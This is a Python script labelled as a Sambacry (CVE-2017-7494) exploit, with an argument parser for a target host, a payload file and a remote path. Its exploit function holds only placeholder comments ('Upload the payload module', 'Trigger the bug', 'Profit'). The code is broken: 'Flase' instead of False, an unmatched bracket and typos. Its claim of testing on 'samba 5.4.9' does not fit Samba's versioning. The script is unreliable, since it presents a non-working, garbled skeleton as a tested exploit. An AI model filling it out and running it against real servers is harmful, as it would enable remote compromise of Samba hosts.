#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
    Sambacry (CVE-2017-7494) exploit by opsxcq
        github.com/opsxcq
        twitter.com/opsxcq

    Tested on samba 5.4.9
"""

from sys import argv, exit
from argparse import ArgumentParser

from impacket.dcerpc.v5 import samr, transport, srvs
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smbconnection import *


def exploit(target, payload, remotepath,  user, password):
    """Samba exploit"""
   

    # Upload the payload module

    # Trigger the bug

    # Profit


if __name__ == "__main__":
    ap = ArgumentParser(description="Sambacry (CVE-2017-7494) exploit by opsxcq")
    ap.add_argument("-t", "--target", required=True, help="Target's hostname")
    ap.add_argument("-e", "--executable", required=True, help="Executable/Payload file to use")
    ap.add_argument("-r", "--remotepath", required=True, help="Executable/Payload path on remote file system")
    ap.add_argument("-u", "--user", required=Flase, help="Samba username (optional")
    ap.add_argument("-p", "--password", required=False, help="Samba password (optional)")

    args = vars(ap.parse_args())

    try:
        print("[*] Starting the expooit")
        exploit(args["target"], args["executable"], args["remotepath"], args["user"], args["password")
    except IOError:
        exit("[!] Error")
    except KeyboardInterrupt:
        print("\n[*] Aborting the  attack")
